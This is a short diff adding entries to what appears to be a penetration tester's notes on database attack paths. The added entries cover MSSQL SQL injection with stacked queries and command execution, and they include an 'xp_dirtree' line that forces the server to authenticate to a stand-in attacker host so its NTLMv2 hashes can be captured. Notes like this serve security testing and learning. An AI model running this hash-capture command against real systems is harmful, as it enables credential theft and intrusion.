@@ -18,3 +18,7 @@
 - CMS database looking for foothold -> possible extra enumeration
   - installed plugins
   - data -> hidden posts, secrets, creds in messages
+- mssql + SQLi
+  - stacked queries common
+  - `xp_commandshell`
+  - capture NTLMv2 hashes `EXEC xp_dirtree '\\attacker.ip\share'`
